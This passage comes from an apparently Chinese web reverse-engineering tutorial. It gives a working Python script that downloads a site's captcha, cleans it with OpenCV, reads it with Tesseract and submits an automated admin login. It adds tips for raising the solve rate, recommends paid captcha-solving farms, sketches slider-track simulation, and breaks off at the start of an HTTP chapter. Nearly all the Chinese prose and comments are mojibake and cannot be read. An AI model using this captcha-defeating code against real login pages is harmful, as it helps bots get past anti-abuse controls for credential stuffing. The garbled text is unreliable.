<span class="kn">from</span><span class="w"> </span><span class="nn">io</span><span class="w"> </span><span class="kn">import</span> <span class="n">BytesIO</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">cv2</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">numpy</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">np</span>

<span class="k">class</span><span class="w"> </span><span class="nc">CaptchaBypass</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">base_url</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">base_url</span> <span class="o">=</span> <span class="n">base_url</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">download_captcha</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä¸‹è½½éªŒè¯ç &quot;&quot;&quot;</span>
        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/captcha&quot;</span>
        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span>
        <span class="k">return</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">preprocess_image</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">image_bytes</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;é¢„å¤„ç†å›¾ç‰‡&quot;&quot;&quot;</span>
        <span class="c1"># å­—èŠ‚ â†’ numpy array</span>
        <span class="n">nparr</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">frombuffer</span><span class="p">(</span><span class="n">image_bytes</span><span class="p">,</span> <span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span>
        <span class="n">img</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">imdecode</span><span class="p">(</span><span class="n">nparr</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">IMREAD_COLOR</span><span class="p">)</span>

        <span class="c1"># ç°åº¦åŒ–</span>
        <span class="n">gray</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">cvtColor</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">COLOR_BGR2GRAY</span><span class="p">)</span>

        <span class="c1"># äºŒå€¼åŒ–</span>
        <span class="n">_</span><span class="p">,</span> <span class="n">binary</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">threshold</span><span class="p">(</span><span class="n">gray</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">THRESH_BINARY_INV</span> <span class="o">+</span> <span class="n">cv2</span><span class="o">.</span><span class="n">THRESH_OTSU</span><span class="p">)</span>

        <span class="c1"># å»å™ª</span>
        <span class="n">kernel</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">ones</span><span class="p">((</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span>
        <span class="n">opening</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">morphologyEx</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">MORPH_OPEN</span><span class="p">,</span> <span class="n">kernel</span><span class="p">,</span> <span class="n">iterations</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>

        <span class="c1"># numpy array â†’ PIL Image</span>
        <span class="n">img_pil</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">fromarray</span><span class="p">(</span><span class="n">opening</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">img_pil</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">recognize_captcha</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">img</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;OCR è¯†åˆ«&quot;&quot;&quot;</span>
        <span class="n">text</span> <span class="o">=</span> <span class="n">pytesseract</span><span class="o">.</span><span class="n">image_to_string</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="n">config</span><span class="o">=</span><span class="s1">&#39;--psm 7 digits&#39;</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">result</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è‡ªåŠ¨ç™»å½•&quot;&quot;&quot;</span>
        <span class="c1"># 1. ä¸‹è½½éªŒè¯ç </span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ğŸ“¥ ä¸‹è½½éªŒè¯ç ...&quot;</span><span class="p">)</span>
        <span class="n">captcha_bytes</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">download_captcha</span><span class="p">()</span>

        <span class="c1"># 2. é¢„å¤„ç†</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ğŸ”§ é¢„å¤„ç†å›¾ç‰‡...&quot;</span><span class="p">)</span>
        <span class="n">processed_img</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">preprocess_image</span><span class="p">(</span><span class="n">captcha_bytes</span><span class="p">)</span>

        <span class="c1"># 3. è¯†åˆ«</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ğŸ” è¯†åˆ«éªŒè¯ç ...&quot;</span><span class="p">)</span>
        <span class="n">captcha_code</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">recognize_captcha</span><span class="p">(</span><span class="n">processed_img</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;âœ… è¯†åˆ«ç»“æœ: </span><span class="si">{</span><span class="n">captcha_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="c1"># 4. ç™»å½•</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ğŸš€ å‘é€ç™»å½•è¯·æ±‚...&quot;</span><span class="p">)</span>
        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
            <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/api/login&quot;</span><span class="p">,</span>
            <span class="n">json</span><span class="o">=</span><span class="p">{</span>
                <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
                <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
                <span class="s1">&#39;captcha&#39;</span><span class="p">:</span> <span class="n">captcha_code</span>
            <span class="p">}</span>
        <span class="p">)</span>

        <span class="n">result</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;ğŸ“¥ å“åº”: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">result</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">bypass</span> <span class="o">=</span> <span class="n">CaptchaBypass</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">bypass</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;123456&#39;</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ğŸ‰ ç™»å½•æˆåŠŸï¼&quot;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;âŒ ç™»å½•å¤±è´¥: </span><span class="si">{</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="52-è¿è¡Œæµ‹è¯•">5.2 è¿è¡Œæµ‹è¯•</h4>

      <div class="codehilite">
        <pre><span></span><code>python<span class="w"> </span>auto_login.py
</code></pre>
      </div>

      <p><strong>é¢„æœŸè¾“å‡º</strong>:</p>

      <pre><code>ğŸ“¥ ä¸‹è½½éªŒè¯ç ...
ğŸ”§ é¢„å¤„ç†å›¾ç‰‡...
ğŸ” è¯†åˆ«éªŒè¯ç ...
âœ… è¯†åˆ«ç»“æœ: 1234
ğŸš€ å‘é€ç™»å½•è¯·æ±‚...
ğŸ“¥ å“åº”: {'code': 0, 'message': 'ç™»å½•æˆåŠŸ', 'token': '...'}
ğŸ‰ ç™»å½•æˆåŠŸï¼
</code></pre>

      <hr />

      <h2 id="éªŒè¯æ¸…å•">âœ… éªŒè¯æ¸…å•</h2>

      <p>å®Œæˆåï¼Œæ£€æŸ¥ä»¥ä¸‹é¡¹ç›®ï¼š</p>

      <ul>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> æˆåŠŸä¸‹è½½éªŒè¯ç å›¾ç‰‡</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> Tesseract OCR èƒ½æ­£å¸¸è¯†åˆ«</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> é¢„å¤„ç†æé«˜äº†è¯†åˆ«ç‡</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> å®Œæ•´çš„è‡ªåŠ¨åŒ–æµç¨‹èƒ½è¿è¡Œ</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> è¯†åˆ«å‡†ç¡®ç‡è¾¾åˆ° 60% ä»¥ä¸Š</li>
      </ul>

      <hr />

      <h2 id="è¿›é˜¶ç»ƒä¹ ">ğŸ“ è¿›é˜¶ç»ƒä¹ </h2>

      <h3 id="ç»ƒä¹ 1-æé«˜è¯†åˆ«ç‡">ç»ƒä¹ 1: æé«˜è¯†åˆ«ç‡</h3>

      <p>å°è¯•ä¸åŒçš„é¢„å¤„ç†æ–¹æ³•ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æ–¹æ³•1: è°ƒæ•´äºŒå€¼åŒ–é˜ˆå€¼</span>
<span class="n">_</span><span class="p">,</span> <span class="n">binary</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">threshold</span><span class="p">(</span><span class="n">gray</span><span class="p">,</span> <span class="mi">150</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">THRESH_BINARY</span><span class="p">)</span>

<span class="c1"># æ–¹æ³•2: è†¨èƒ€å’Œè…èš€</span>
<span class="n">dilate</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">dilate</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="n">kernel</span><span class="p">,</span> <span class="n">iterations</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
<span class="n">erode</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">erode</span><span class="p">(</span><span class="n">dilate</span><span class="p">,</span> <span class="n">kernel</span><span class="p">,</span> <span class="n">iterations</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># æ–¹æ³•3: å»é™¤è¾¹æ¡†</span>
<span class="n">h</span><span class="p">,</span> <span class="n">w</span> <span class="o">=</span> <span class="n">gray</span><span class="o">.</span><span class="n">shape</span>
<span class="n">gray</span> <span class="o">=</span> <span class="n">gray</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="n">h</span><span class="o">-</span><span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">:</span><span class="n">w</span><span class="o">-</span><span class="mi">5</span><span class="p">]</span>
</code></pre>
      </div>

      <h3 id="ç»ƒä¹ 2-å¤„ç†å­—æ¯éªŒè¯ç ">ç»ƒä¹ 2: å¤„ç†å­—æ¯éªŒè¯ç </h3>

      <p>ä¿®æ”¹ OCR é…ç½®ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è¯†åˆ«å­—æ¯+æ•°å­—</span>
<span class="n">text</span> <span class="o">=</span> <span class="n">pytesseract</span><span class="o">.</span><span class="n">image_to_string</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="n">config</span><span class="o">=</span><span class="s1">&#39;--psm 7&#39;</span><span class="p">)</span>

<span class="c1"># åªè¯†åˆ«å¤§å†™å­—æ¯+æ•°å­—</span>
<span class="n">text</span> <span class="o">=</span> <span class="n">pytesseract</span><span class="o">.</span><span class="n">image_to_string</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="n">config</span><span class="o">=</span><span class="s1">&#39;--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="ç»ƒä¹ 3-ä½¿ç”¨æœºå™¨å­¦ä¹ ">ç»ƒä¹ 3: ä½¿ç”¨æœºå™¨å­¦ä¹ </h3>

      <p>å¯¹äºå¤æ‚éªŒè¯ç ï¼Œå¯ä»¥ä½¿ç”¨æ·±åº¦å­¦ä¹ ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä½¿ç”¨ CRNN æ¨¡å‹</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">torch</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">crnn</span><span class="w"> </span><span class="kn">import</span> <span class="n">CRNN</span>

<span class="n">model</span> <span class="o">=</span> <span class="n">CRNN</span><span class="p">()</span>
<span class="n">model</span><span class="o">.</span><span class="n">load_state_dict</span><span class="p">(</span><span class="n">torch</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s1">&#39;captcha_model.pth&#39;</span><span class="p">))</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">model</span><span class="o">.</span><span class="n">predict</span><span class="p">(</span><span class="n">img</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>è®­ç»ƒæ•°æ®</strong>: éœ€è¦æ ‡æ³¨1000+éªŒè¯ç æ ·æœ¬</p>

      <hr />

      <h2 id="å¸¸è§é—®é¢˜">â— å¸¸è§é—®é¢˜</h2>

      <h3 id="q1-ocr-å®Œå…¨è¯†åˆ«ä¸å‡ºæ¥æ€ä¹ˆåŠ">Q1: OCR å®Œå…¨è¯†åˆ«ä¸å‡ºæ¥æ€ä¹ˆåŠï¼Ÿ</h3>

      <p><strong>A</strong>: å¯èƒ½çš„åŸå› å’Œè§£å†³æ–¹æ¡ˆï¼š</p>

      <ol>
        <li>
          <p><strong>å¹²æ‰°å¤ªå¼º</strong>:</p>

          <ul>
            <li>å°è¯•æ›´æ¿€è¿›çš„é¢„å¤„ç†</li>
            <li>ä½¿ç”¨æœºå™¨å­¦ä¹ æ¨¡å‹</li>
            <li>è€ƒè™‘ä½¿ç”¨æ‰“ç å¹³å°</li>
          </ul>
        </li>
        <li>
          <p><strong>å­—ä½“ç‰¹æ®Š</strong>:</p>

          <ul>
            <li>è®­ç»ƒ Tesseract è‡ªå®šä¹‰å­—ä½“</li>
            <li>ä½¿ç”¨æ·±åº¦å­¦ä¹ æ¨¡å‹</li>
          </ul>
        </li>
        <li>
          <p><strong>éªŒè¯ç ç±»å‹ä¸é€‚åˆ OCR</strong>:</p>

          <ul>
            <li>æ»‘å—éªŒè¯ç  â†’ ä½¿ç”¨è½¨è¿¹æ¨¡æ‹Ÿ</li>
            <li>ç‚¹é€‰éªŒè¯ç  â†’ ä½¿ç”¨å›¾åƒè¯†åˆ«</li>
            <li>è¡Œä¸ºéªŒè¯ç  â†’ åˆ†æè¡Œä¸ºæ¨¡å¼</li>
          </ul>
        </li>
      </ol>

      <h3 id="q2-è¯†åˆ«ç‡åªæœ‰30å¦‚ä½•æé«˜">Q2: è¯†åˆ«ç‡åªæœ‰30%ï¼Œå¦‚ä½•æé«˜ï¼Ÿ</h3>

      <p><strong>A</strong>: æŒ‰é¡ºåºå°è¯•ï¼š</p>

      <ol>
        <li><strong>ä¼˜åŒ–é¢„å¤„ç†</strong> (å¯æå‡åˆ°60%)</li>
        <li><strong>è°ƒæ•´ OCR å‚æ•°</strong> (å¯æå‡åˆ°70%)</li>
        <li><strong>å¤šæ¬¡è¯†åˆ«å–æœ€å¯èƒ½ç»“æœ</strong> (å¯æå‡åˆ°80%)</li>
        <li><strong>è®­ç»ƒè‡ªå®šä¹‰æ¨¡å‹</strong> (å¯æå‡åˆ°90%+)</li>
      </ol>

      <p><strong>ä»£ç ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å¤šæ¬¡è¯†åˆ«</span>
<span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">recognize_captcha</span><span class="p">(</span><span class="n">img</span><span class="p">)</span>
    <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

<span class="c1"># å–å‡ºç°æœ€å¤šçš„ç»“æœ</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">collections</span><span class="w"> </span><span class="kn">import</span> <span class="n">Counter</span>
<span class="n">most_common</span> <span class="o">=</span> <span class="n">Counter</span><span class="p">(</span><span class="n">results</span><span class="p">)</span><span class="o">.</span><span class="n">most_common</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
</code></pre>
      </div>

      <h3 id="q3-ä½•æ—¶åº”è¯¥ä½¿ç”¨æ‰“ç å¹³å°">Q3: ä½•æ—¶åº”è¯¥ä½¿ç”¨æ‰“ç å¹³å°ï¼Ÿ</h3>

      <p><strong>A</strong>: ä»¥ä¸‹æƒ…å†µå»ºè®®ä½¿ç”¨æ‰“ç å¹³å°ï¼š</p>

      <ul>
        <li>éªŒè¯ç éå¸¸å¤æ‚ï¼ˆæ‰­æ›²ã€é‡å ã€èƒŒæ™¯å¤æ‚ï¼‰</li>
        <li>è¯†åˆ«ç‡ä½äº60%ä¸”ä¼˜åŒ–æ— æ•ˆ</li>
        <li>éªŒè¯ç ç±»å‹å¤šå˜</li>
        <li>é¡¹ç›®é¢„ç®—å……è¶³</li>
      </ul>

      <p><strong>æ¨èå¹³å°</strong>:</p>

      <ul>
        <li>è¶…çº§é¹°: <a href="http://www.chaojiying.com/">http://www.chaojiying.com/</a></li>
        <li>æ‰“ç å…”: <a href="http://www.dama2.com/">http://www.dama2.com/</a></li>
      </ul>

      <p><strong>æˆæœ¬</strong>: çº¦ Â¥0.001 - Â¥0.01 / å¼ </p>

      <h3 id="q4-å¦‚ä½•å¤„ç†æ»‘å—éªŒè¯ç ">Q4: å¦‚ä½•å¤„ç†æ»‘å—éªŒè¯ç ï¼Ÿ</h3>

      <p><strong>A</strong>: æ»‘å—éªŒè¯ç ä¸é€‚åˆ OCRï¼Œéœ€è¦ï¼š</p>

      <ol>
        <li>
          <p><strong>æ¨¡æ‹Ÿæ»‘åŠ¨è½¨è¿¹</strong>:</p>

          <div class="codehilite">
            <pre><span></span><code><span class="c1"># ç”Ÿæˆæ¨¡æ‹Ÿäººç±»çš„è½¨è¿¹</span>
<span class="k">def</span><span class="w"> </span><span class="nf">generate_track</span><span class="p">(</span><span class="n">distance</span><span class="p">):</span>
    <span class="n">track</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">current</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">current</span> <span class="o">&lt;</span> <span class="n">distance</span><span class="p">:</span>
        <span class="n">v</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>
        <span class="n">track</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
        <span class="n">current</span> <span class="o">+=</span> <span class="n">v</span>
    <span class="k">return</span> <span class="n">track</span>
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>åˆ†æç¼ºå£ä½ç½®</strong>:</p>

          <ul>
            <li>ä½¿ç”¨å›¾åƒè¯†åˆ«æ‰¾åˆ°ç¼ºå£</li>
            <li>è®¡ç®—éœ€è¦ç§»åŠ¨çš„è·ç¦»</li>
          </ul>
        </li>
      </ol>

      <p>å‚è€ƒ: <a href="#04-Advanced-Recipes-captcha-bypass">éªŒè¯ç ç»•è¿‡</a></p>

      <hr />

      <h2 id="åŸç†è§£æ">ğŸ” åŸç†è§£æ</h2>

      <h3 id="ocr-å·¥ä½œåŸç†">OCR å·¥ä½œåŸç†</h3>

      <pre><code>å›¾ç‰‡ â†’ é¢„å¤„ç† â†’ ç‰¹å¾æå– â†’ å­—ç¬¦åˆ†ç±» â†’ æ–‡æœ¬è¾“å‡º
</code></pre>

      <p><strong>å…³é”®æ­¥éª¤</strong>:</p>

      <ol>
        <li><strong>äºŒå€¼åŒ–</strong>: è½¬ä¸ºé»‘ç™½å›¾ç‰‡ï¼Œçªå‡ºæ–‡å­—</li>
        <li><strong>å»å™ª</strong>: ç§»é™¤å¹²æ‰°ç‚¹å’Œçº¿æ¡</li>
        <li><strong>åˆ†å‰²</strong>: å°†å­—ç¬¦åˆ†å‰²ä¸ºç‹¬ç«‹çš„éƒ¨åˆ†</li>
        <li><strong>è¯†åˆ«</strong>: å°†æ¯ä¸ªå­—ç¬¦ä¸å­—åº“å¯¹æ¯”</li>
      </ol>

      <h3 id="ä¸ºä»€ä¹ˆéœ€è¦é¢„å¤„ç†">ä¸ºä»€ä¹ˆéœ€è¦é¢„å¤„ç†ï¼Ÿ</h3>

      <p>åŸå§‹éªŒè¯ç çš„å¹²æ‰°ï¼š</p>

      <ul>
        <li>å™ªç‚¹ï¼ˆéšæœºç‚¹ï¼‰</li>
        <li>å¹²æ‰°çº¿ï¼ˆéšæœºçº¿æ¡ï¼‰</li>
        <li>é¢œè‰²å˜åŒ–</li>
        <li>å­—ç¬¦ç²˜è¿æˆ–æ–­è£‚</li>
      </ul>

      <p>é¢„å¤„ç†å¯ä»¥ï¼š</p>

      <ul>
        <li>å»é™¤å™ªç‚¹å’Œçº¿æ¡</li>
        <li>ç»Ÿä¸€é¢œè‰²ï¼ˆé»‘ç™½ï¼‰</li>
        <li>ä¿®å¤æ–­è£‚</li>
        <li>åˆ†ç¦»ç²˜è¿</li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³é…æ–¹">ğŸ“š ç›¸å…³é…æ–¹</h2>

      <h3 id="åŸºç¡€é…æ–¹">åŸºç¡€é…æ–¹</h3>

      <ul>
        <li><a href="#03-Basic-Recipes-debugging-techniques">è°ƒè¯•æŠ€å·§</a> - è°ƒè¯•éªŒè¯æµç¨‹</li>
      </ul>

      <h3 id="é«˜çº§é…æ–¹">é«˜çº§é…æ–¹</h3>

      <ul>
        <li><a href="#04-Advanced-Recipes-captcha-bypass">éªŒè¯ç è¯†åˆ«ä¸ç»•è¿‡</a> - æ›´å¤šéªŒè¯ç ç±»å‹</li>
        <li><a href="#04-Advanced-Recipes-browser-fingerprinting">æµè§ˆå™¨æŒ‡çº¹</a> - è¡Œä¸ºéªŒè¯ç </li>
      </ul>

      <h3 id="å·¥å…·è„šæœ¬">å·¥å…·è„šæœ¬</h3>

      <ul>
        <li><a href="#07-Scripts-automation-scripts">è‡ªåŠ¨åŒ–è„šæœ¬</a> - Selenium è‡ªåŠ¨åŒ–</li>
      </ul>

      <hr />

      <h2 id="æ­å–œ">ğŸ‰ æ­å–œï¼</h2>

      <p>ä½ å·²ç»æŒæ¡äº†ï¼š</p>

      <ul>
        <li>âœ… éªŒè¯ç æµç¨‹åˆ†æ</li>
        <li>âœ… OCR åŸºç¡€ä½¿ç”¨</li>
        <li>âœ… å›¾åƒé¢„å¤„ç†æŠ€å·§</li>
        <li>âœ… è‡ªåŠ¨åŒ–éªŒè¯ç è¯†åˆ«</li>
      </ul>

      <p><strong>ä¸‹ä¸€æ­¥</strong>:</p>

      <ul>
        <li>æ·±å…¥å­¦ä¹  <a href="#04-Advanced-Recipes-captcha-bypass">éªŒè¯ç ç»•è¿‡</a></li>
        <li>æˆ–å¼€å§‹ <a href="../../03-Basic-Recipes/">åŸºç¡€é…æ–¹</a> çš„ç³»ç»Ÿå­¦ä¹ </li>
      </ul>

      <hr />

      <p><strong>å°è´´å£«</strong>:</p>

      <ul>
        <li>OCR ä¸æ˜¯ä¸‡èƒ½çš„ï¼Œå¤æ‚éªŒè¯ç éœ€è¦æœºå™¨å­¦ä¹ </li>
        <li>éµå®ˆç½‘ç«™çš„æœåŠ¡æ¡æ¬¾å’Œè¯·æ±‚é¢‘ç‡é™åˆ¶</li>
        <li>åˆæ³•åˆè§„ä½¿ç”¨è¿™äº›æŠ€æœ¯</li>
      </ul>

      <p>Happy Bypassing! ğŸ¤–</p>

    </div>
  </div>
  <div class="chapter">
    <h1 class="no-page-break">ğŸ“„ Part II: Kitchen Basics</h1>

    <div class="section" id="01-Foundations-http-https-protocol">
      <h2>5. HTTP/HTTPS Protocol</h2>
      <h1 id="httphttps-åè®®">HTTP/HTTPS åè®®</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>HTTP (HyperText Transfer Protocol) å’Œ HTTPS (HTTP Secure) æ˜¯ Web é€šä¿¡çš„åŸºç¡€åè®®ã€‚ç†è§£è¿™äº›åè®®å¯¹äº Web é€†å‘å·¥ç¨‹è‡³å…³é‡è¦ã€‚</p>

      <hr />

      <h2 id="http-åŸºç¡€">HTTP åŸºç¡€</h2>

      <h3 id="è¯·æ±‚æ–¹æ³•">è¯·æ±‚æ–¹æ³•</h3>

      <p>å¸¸è§çš„ HTTP æ–¹æ³•ï¼š</p>

      <ul>
        <li><strong>GET</strong>: è¯·æ±‚æŒ‡å®šçš„èµ„æºï¼Œå‚æ•°åœ¨ URL ä¸­</li>
        <li><strong>POST</strong>: å‘æœåŠ¡å™¨æäº¤æ•°æ®ï¼Œå‚æ•°åœ¨è¯·æ±‚ä½“ä¸­</li>
        <li><strong>PUT</strong>: æ›´æ–°èµ„æº</li>
        <li><strong>DELETE</strong>: åˆ é™¤èµ„æº</li>
        <li><strong>HEAD</strong>: ç±»ä¼¼ GETï¼Œä½†åªè¿”å›å¤´éƒ¨</li>
        <li><strong>OPTIONS</strong>: è·å–æœåŠ¡å™¨æ”¯æŒçš„æ–¹æ³•</li>
        <li><strong>PATCH</strong>: éƒ¨åˆ†æ›´æ–°èµ„æº</li>
      </ul>

      <h3 id="è¯·æ±‚ç»“æ„">è¯·æ±‚ç»“æ„</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nf">GET</span> <span class="nn">/api/users?id=123</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">example.com</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">session_id=abc123</span>
</code></pre>
      </div>

      <p><strong>ç»„æˆéƒ¨åˆ†</strong>ï¼š</p>

      <ol>
        <li>è¯·æ±‚è¡Œï¼šæ–¹æ³• + è·¯å¾„ + åè®®ç‰ˆæœ¬</li>
        <li>è¯·æ±‚å¤´ï¼šKey-Value é”®å€¼å¯¹</li>
        <li>ç©ºè¡Œ</li>
        <li>è¯·æ±‚ä½“ï¼ˆå¯é€‰ï¼‰</li>
      </ol>

      <h3 id="å“åº”ç»“æ„">å“åº”ç»“æ„</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
